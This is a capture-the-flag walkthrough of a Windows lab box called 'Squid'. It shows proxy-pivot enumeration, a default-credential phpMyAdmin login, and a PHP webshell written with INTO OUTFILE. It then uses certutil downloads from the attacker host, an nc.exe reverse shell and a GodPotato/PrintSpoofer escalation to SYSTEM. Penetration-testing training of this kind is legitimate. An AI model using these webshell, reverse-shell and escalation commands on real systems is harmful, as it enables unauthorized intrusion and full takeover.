# Squid

## Initial access

Ran an automated enumeration scan against the target host.

```
sudo autorecon 192.168.112.189
```

The scan revealed five open ports:

- **135** — RPC (Microsoft Windows RPC), indicating a 64-bit machine
- **139** — NetBIOS (Microsoft Windows netbios-ssn)
- **445** — SMB
- **3128** — HTTP Proxy (Squid http proxy 4.14)
- **49666** — RPC (Microsoft Windows RPC)

Enumerated SMB with various tools, but all attempts to connect failed:

```
smbclient -L //192.168.112.189/ -N
session setup failed: NT_STATUS_ACCESS_DENIED

nxc smb 192.168.112.189 -u '' -p '' --shares
SMB         192.168.112.189 445    SQUID            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQUID) (domain:SQUID) (signing:True) (SMBv1:None)
SMB         192.168.112.189 445    SQUID            [-] SQUID\: STATUS_ACCESS_DENIED 
SMB         192.168.112.189 445    SQUID            [-] Error enumerating shares: Error occurs while reading from remote(104)

enum4linux-ng 192.168.112.189 -A -Gm -R -t 15
 ==============================================================
|    Domain Information via SMB session for 192.168.112.189    |
 ==============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: SQUID
NetBIOS domain name: ''
DNS domain: SQUID
FQDN: SQUID
Derived membership: workgroup member
Derived domain: unknown
...
 ==================================================
|    OS Information via RPC for 192.168.112.189    |
 ==================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null
```

A NULL session could not be established, and SMB enumeration did not yield accessible shares.

Explored `http://192.168.112.189:3128/` in a browser. The page returned a Squid error message with version disclosure:

```
Generated Thu, 12 Nov 2026 12:16:09 GMT by SQUID (squid/4.14)
```

Squid is an open-source, high-performance caching and forwarding web proxy server. The bottom of the page confirmed Squid version 4.14.

Checked for known vulnerabilities against Squid 4.14:

```
searchsploit squid 4.14
Exploits: No Results
Shellcodes: No Results
```

No known exploits were found for this version.

Enumerated the Squid proxy using the SPOSE (Squid Pivoting Open Port Scanner) tool to discover internal ports behind the proxy, following the HackTricks guide at https://hacktricks.wiki/network-services-pentesting/3128-pentesting-squid.html:

```
python3 spose.py --proxy http://192.168.112.189:3128 --target 192.168.112.189
Scanning default common ports
Using proxy address http://192.168.112.189:3128
192.168.112.189:3306 seems OPEN
192.168.112.189:8080 seems OPEN
```

Two additional internal ports were discovered: **3306** (MySQL) and **8080** (HTTP).

Configured Firefox to route traffic through the Squid proxy using the FoxyProxy extension. Added a new proxy entry with hostname `192.168.112.189` on port `3128`, then switched the browser profile to use it.

Navigated to `http://192.168.112.189:8080/` through the proxy. The page displayed a Wampserver 3.2.3 installation with the following components:

- Apache version: 2.4.46
- PHP version: 7.3.21
- MySQL version: 5.7.31 (port 3306)
- MySQL version: 10.4.13 (port 3307)

The following subdirectories were also discovered:

- `http://192.168.112.189:8080/?phpinfo=-1`
- `http://192.168.112.189:8080/adminer/`
- `http://192.168.112.189:8080/phpmyadmin/`
- `http://192.168.112.189:8080/phpsysinfo/` (redirects to `http://192.168.112.189:8080/phpsysinfo/index.php?disp=bootstrap`)

Examined `http://192.168.112.189:8080/?phpinfo=-1` to determine the document root: `C:/wamp/www`.

Adminer version 4.7.7 was found at `http://192.168.112.189:8080/adminer/`, but it required authentication.

phpMyAdmin version 5.0.2 was found at `http://192.168.112.189:8080/phpmyadmin/`. Logged in using the default credentials `root:` (empty password).

Created a PHP webshell using MySQL's `INTO OUTFILE` functionality:

```
SELECT "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE "C:/wamp/www/shell.php";
```

Verified the webshell at `http://192.168.112.189:8080/shell.php?cmd=whoami`:

```
nt authority\local service
```

The webshell executed commands successfully under the `nt authority\local service` account.

Downloaded `nc64.exe` onto the webserver to establish a reverse shell. Started an HTTP server on the attacker machine:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189/24
```

Used `certutil` on the target to download the netcat binary:

```
# Command to download nc64.exe and save as nc.exe
certutil -urlcache -split -f http://192.168.45.189:9001/windows/shells/nc64.exe nc.exe
```

Generated a PowerShell reverse shell payload using https://www.revshells.com/ (`nc.exe -e`):

```
nc.exe%20192.168.45.189%204444%20-e%20cmd
```

Browsed to the webshell with the reverse shell query parameter and caught a reverse shell with penelope:

```
http://192.168.109.189:8080/shell.php?cmd=nc.exe%20192.168.45.189%204444%20-e%20cmd
```

```
C:\wamp\www>whoami
whoami
nt authority\local service
```

Retrieved the `local.txt` flag:

```
C:\wamp\www>powershell -c "Get-ChildItem C:\ -Recurse -Filter local.txt -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName"
C:\local.txt

C:\wamp\www>type C:\local.txt
ad23c11fd46274d8034a17312e71fbb3
```

## Privilege escalation

Uploaded `winPEASx64.exe` to the target for privilege escalation enumeration. Moved to `C:\Windows\Temp` and downloaded the binary via `certutil`:

```
C:\wamp\www>cd C:\Windows\Temp
C:\Windows\Temp>certutil -urlcache -split -f http://192.168.45.189:9001/windows/enum/winPEASx64.exe winPEASx64.exe
```

Ran `winPEASx64.exe` to enumerate privilege escalation vectors:

```
C:\Windows\Temp>C:\Windows\Temp\winPEASx64.exe
```

The most notable findings from the output were related to the current user's token privileges:

```
???????????? Users (T1087.001)
  Current user: LOCAL SERVICE

???????????? Current process token privileges (T1134.001)
...
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
```

The `LOCAL SERVICE` account was missing several privileges that should be enabled by default. Referenced the Microsoft documentation at https://learn.microsoft.com/en-us/windows/win32/services/localservice-account to confirm the expected privilege set, indicating the process token was restricted.

Downloaded and ran FullPowers, a Windows privilege recovery tool that restores the missing default privileges by creating a scheduled task with a properly tokenized process:

```
C:\Windows\Temp>certutil -urlcache -split -f http://192.168.45.189:9001/windows/privesc/FullPowers.exe FullPowers.exe

PS C:\Windows\Temp> C:\Windows\Temp\FullPowers.exe
[+] Started dummy thread with id 96
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

FullPowers successfully restored the default privileges, including `SeImpersonatePrivilege`, which can be abused for privilege escalation.

Used GodPotato (compiled for .NET 4) to exploit `SeImpersonatePrivilege` and catch a privileged shell with penelope:

```
C:\wamp\www>cd C:\Windows\Temp
C:\Windows\Temp>dir C:\Windows\Microsoft.NET\Framework\
...
11/16/2026  04:43 AM    <DIR>          v4.0.30319

# Use GodPotato built for NET4
C:\Windows\Temp>certutil -urlcache -split -f http://192.168.45.189:9001/windows/privesc/GodPotato-NET4.exe GodPotato.exe
C:\Windows\Temp>C:\Windows\Temp\GodPotato.exe -cmd "C:\wamp\www\nc.exe 192.168.45.189 4444 -e cmd.exe"

# penelope
C:\Windows\Temp>whoami
nt authority\system
```

Retrieved the `proof.txt` flag:

```
C:\Windows\Temp>powershell -c "Get-ChildItem C:\ -Recurse -Filter proof.txt -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName"
C:\Users\Administrator\Desktop\proof.txt

C:\Windows\Temp>type C:\Users\Administrator\Desktop\proof.txt
ae78f52aecfb554c026632b5e490f808
```

### Alternative Privilege Escalation — FullPowers + PrintSpoofer

After using FullPowers to restore the `SeImpersonatePrivilege` privilege, PrintSpoofer can be used instead of GodPotato to escalate to SYSTEM. PrintSpoofer abuses the SeImpersonatePrivilege via a token impersonation vulnerability in the Windows Print Spooler service. Upload PrintSpoofer to the target and execute it with a command to spawn a reverse shell or interactive SYSTEM prompt: `PrintSpoofer.exe -i -c cmd.exe`. This yields a `nt authority\system` shell without needing GodPotato. Credit: [Mr.KaaLi — OSCP Prep Box 67: Squid](https://www.mrkaali.com/oscp-prep-box-67-squid)
